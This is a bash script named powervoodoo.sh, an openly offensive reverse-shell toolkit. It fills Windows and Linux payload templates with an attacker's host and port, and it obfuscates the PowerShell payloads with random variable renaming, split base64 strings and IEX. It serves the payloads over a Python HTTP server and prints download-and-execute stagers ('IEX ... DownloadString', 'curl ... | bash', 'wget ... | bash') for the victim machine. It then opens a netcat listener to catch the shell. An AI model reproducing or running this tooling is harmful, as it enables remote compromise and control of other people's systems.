#!/usr/bin/bash

# THEMES
#
# themes will consists of :  MC="main color" # SC="secondary color" # EC="errors color" # NC="no color" ( reset )

# YOU CAN CHANGE THEMES BY COMMENTING/UNCOMMENTING IT'S REPRESENTATIVE LINE !

MC='\033[0;93m' ; SC='\033[0;97m'; EC='\033[0;91m'; NC='\033[0m' #  <---  YELLOW_AND_WHITE_THEME
#MC='\033[0;95m' ; SC='\033[0;97m'; EC='\033[0;91m'; NC='\033[0m' #  <---  PURPLE_AND_WHITE_THEME
#MC='\033[0;92m' ; SC='\033[0;97m'; EC='\033[0;91m'; NC='\033[0m' #  <---  GREEN_AND_WHITE_THEME 



function usage {
  echo "Usage:"
  echo " powervoodoo.sh lhost=<LHOST> lport=<LPORT> os=<TARGET-OS> "
  echo 
  echo "Arguments:"
  echo " lhost=<LHOST>		Your local IP address or public IP to receive the shell"
  echo " lport=<LPORT>		The port number to listen on (e.g., 9001)"
  echo " os=<TARGET-OS>		Target operating system: 'windows' or 'linux'"  
  echo
  echo "Examples:"
  echo " powervoodoo.sh lhost=192.168.1.23 lport=4444 os=windows"
  echo " powervoodoo.sh lhost=192.168.1.23 lport=4444 os=linux"
}



function generate_payloads {
  lhost=$1
  lport=$2
  target_os=$3
  
  if [ $target_os = "windows" ];
  then
    echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} Generating payloads for ${NC}$target_os...${NC}"
    cat payload_templates/windows/payload_template_simple.ps1 | sed "s/LHOST/$lhost/g" | sed "s/LPORT/$lport/g" > payloads/bare.ps1
    cat payload_templates/windows/payload_template_advanced.ps1 | sed "s/LHOST/$lhost/g" | sed "s/LPORT/$lport/g" > payloads/shade.ps1
    cat payload_templates/windows/payload_template_moreadvanced.ps1 | sed "s/LHOST/$lhost/g" | sed "s/LPORT/$lport/g" > payloads/specter.ps1

    obfuscate_payload  payloads/bare.ps1
    obfuscate_payload  payloads/shade.ps1
    obfuscate_payload  payloads/specter.ps1
  
  elif [ $target_os = "linux" ];
  then
    echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} Generating payloads for ${NC}$target_os...${NC}"
    b64_encoded_payload_simple=$(cat payload_templates/linux/payload_template_simple.sh | sed "s/LHOST/$lhost/g" | sed "s/LPORT/$lport/g" | base64 -w 0 | xargs echo -n )
    b64_encoded_payload_advanced=$(cat payload_templates/linux/payload_template_advanced.sh | sed "s/LHOST/$lhost/g" | sed "s/LPORT/$lport/g" | base64 -w 0 | xargs echo -n )
    echo "echo '$b64_encoded_payload_simple' | base64 -d | bash" > payloads/basic.sh
    echo "echo '$b64_encoded_payload_advanced' | base64 -d | bash" > payloads/ghost.sh
  fi
  echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} Payloads successfully generated !${NC}"
}



function obfuscate_payload() {
  payload=$1
  payload_content=$(cat $payload)
  # Find all variable names and replace them with 3 characters long random string  
  vars_to_rename=($(echo "$payload_content" | grep -oE '\$[a-zA-Z_][a-zA-Z0-9_]*' | sort -u))

  for var in ${vars_to_rename[@]}; do
    rand=$(tr -dc a-z < /dev/urandom | head -c 3)
    payload_content=$(echo "$payload_content" | sed "s/$var/\$$rand/g")
  done 
  # Base64 Encode the final payload content
  base64_encoded_payload=$(echo "$payload_content" | iconv -f utf-8 -t UTF-16LE | base64 -w 0 | xargs echo -n)
  # split it into parts
  part_length=6
  parts=""
  for (( i=0; i<${#base64_encoded_payload}; i+=part_length )); do
    part="${base64_encoded_payload:i:part_length}"
    if [ -z "$parts" ]; then
      parts="'$part'"
    else
      parts="$parts + '$part'"
    fi
  done
  # put everything together
  obfuscated_payload="IEX([system.text.encoding]::unicode.getstring([convert]::frombase64string($parts)))"
  echo $obfuscated_payload > $payload
}



function generate_stagers {
  target_os=$1
  lhost=$2
  
  if [ $target_os = "windows" ];
  then
    # bare
    stager_bare_1="powershell.exe -w 1 -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:8000/bare.ps1')\""
    stager_bare_2="powershell.exe -w 1 -c \"IEX(Invoke-WebRequest 'http://$lhost:8000/bare.ps1' -UseBasicParsing).Content\""
    # shade
    stager_shade_1="powershell.exe -w 1 -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:8000/shade.ps1')\""
    stager_shade_2="powershell.exe -w 1 -c \"IEX(Invoke-WebRequest 'http://$lhost:8000/shade.ps1' -UseBasicParsing).Content\""
    # specter
    stager_specter_1="powershell.exe -w 1 -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:8000/specter.ps1')\""
    stager_specter_2="powershell.exe -w 1 -c \"IEX(Invoke-WebRequest 'http://$lhost:8000/specter.ps1' -UseBasicParsing).Content\""
    
    echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} Run one of this stagers into the target machine : ${NC}"
    echo
    echo -e "  ${MC}Simple :\n   1 ->${SC} $stager_bare_1 ${NC}\n   ${MC}2 ->${SC} $stager_bare_2 ${NC}\n"
    echo -e "  ${MC}Advanced :\n   1 ->${SC} $stager_shade_1 ${NC}\n   ${MC}2 ->${SC} $stager_shade_2 ${NC}\n"
    echo -e "  ${MC}More Advanced :\n   1 ->${SC} $stager_specter_1 ${NC}\n   ${MC}2 ->${SC} $stager_specter_2 ${NC}\n"
    echo
  
  elif [ $target_os = "linux" ];
  then
    # basic
    stager_basic_1="curl -s http://$lhost:8000/basic.sh | bash"
    stager_basic_2="wget http://$lhost:8000/basic.sh -q -O - | bash"
    # ghost
    stager_ghost_1="curl -s http://$lhost:8000/ghost.sh | bash"
    stager_ghost_2="wget http://$lhost:8000/ghost.sh -q -O - | bash"
    
    echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} Run one of this stagers into the target machine : ${NC}"
    echo
    echo -e "  ${MC}Simple :\n   1 ->${SC} $stager_basic_1 ${NC}\n   ${MC}2 ->${SC} $stager_basic_2 ${NC}\n"
    echo -e "  ${MC}Advanced :\n   1 ->${SC} $stager_ghost_1 ${NC}\n   ${MC}2 ->${SC} $stager_ghost_2 ${NC}\n"
    echo
  fi
}


function start_http_server {
  echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} Starting HTTP server...${NC}"
  python3 -m http.server 8000 -d payloads&> /dev/null&
  echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} HTTP server started in the background !${NC}"
}



main() {
  lhost=${1:6}
  lport=${2:6}
  os=${3:3}
  # generate payloads 
  generate_payloads $lhost $lport $os
  echo -e -n "${MC}[${SC}<${MC}] ${NC}~${MC} Enter the HTTP server host to use in the stager (default is ${NC}$lhost${MC} , press Enter to accept): ${NC}" ; read stager_host
  if [[ $stager_host =~ ^([a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+|\d{1,3}(\.\d{1,3}){3}$ ]];
  then
    lhost=$stager_host
  else
    echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} No valid host was provided. Defaulting to ${NC}$lhost${MC} !"
  fi
  echo -e -n "${MC}[${SC}<${MC}] ${NC}~${MC} Enter the listener port to receive the connection (default is ${NC}$lport${MC} , press Enter to accept): ${NC}" ; read listener_port
  if [[ $listener_port =~ ^[0-9]{1,5}$ ]];
  then
    lport=$listener_port
  else
    echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} No valid port was provided. Defaulting to ${NC}$lport${MC} !"
  fi
  # start http server ( for hosting payloads ) 
  start_http_server
  # generate stagers 
  generate_stagers $os $lhost
  # start nc listener
  echo -e "${MC}[${NC}>${MC}] ${NC}~${MC} Starting netcat listener on port [${NC}$lport${MC}]${NC}"
  if command -v rlwrap &> /dev/null ;then
    rlwrap nc -lnvvp $lport
  else
    nc -lnvvp $lport
  fi
  # terminate the server process when we done
  pkill --echo --full "python3 -m http.server 8000 -d payloads"
}


# validate arguments
if [[ "$*" =~ ^lhost=[^[:space:]]+\ lport=[0-9]{1,5}\ os=(windows|linux)$ ]];
then
  main $1 $2 $3
else
  usage
fi
